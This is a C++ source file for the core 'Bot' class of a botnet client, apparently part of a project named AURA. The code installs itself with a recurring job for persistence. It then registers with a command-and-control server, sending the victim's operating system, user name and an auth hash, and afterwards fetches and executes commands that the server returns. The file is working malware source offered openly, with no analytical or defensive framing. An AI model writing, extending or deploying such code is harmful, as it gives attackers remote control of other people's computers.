#include <memory>
#include <string>

#include "command.hh"
#include "installer.hh"
#include "request.hh"
#include "util.hh"

const std::string HASH_TYPE("SHA256");

class Bot {
   public:
    Bot(const std::string& install_dir);
    bool IsNew();
    void Install();
    void RegisterBot(const std::string& register_url);
    void ExecuteCommand(const std::string& command_url);

   private:
    bool is_new_;
    std::string hash_type_, hash_sum_, os_, user_;
    std::unique_ptr<Installer> install_;

    void PrepareSysInfo_();
};

// Initialize auth file and determine if bot is new
Bot::Bot(const std::string& install_dir) {
    hash_type_ = HASH_TYPE;
    install_ = std::make_unique<Installer>(install_dir);
    hash_sum_ = install_->GetAuthHash();
}

bool Bot::IsNew() { return install_->IsNew(); }

// Install files and components
void Bot::Install() {
    install_->InstallFiles();
    install_->InitRecurringJob();
}

// Register bot with C2 server
void Bot::RegisterBot(const std::string& register_url) {
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_type", hash_type_);
    post_form.AddField("hash_sum", hash_sum_);
    post_form.AddField("operating_sys", os_);
    post_form.AddField("user", user_);
    request::Post(register_url, post_form.ToString());
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Update system info and create POST form
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_sum", hash_sum_);

    std::string response = request::Post(command_url, post_form.ToString());

    // Parse response from C2 server and execute based on JSON data
    Command cmd(response);
    cmd.Execute();
}

// Retrieve values if they haven't been already
void Bot::PrepareSysInfo_() {
    if (!(os_.size())) {
        os_ = util::GetOS();
    }
    if (!(user_.size())) {
        user_ = util::GetUser();
    }
}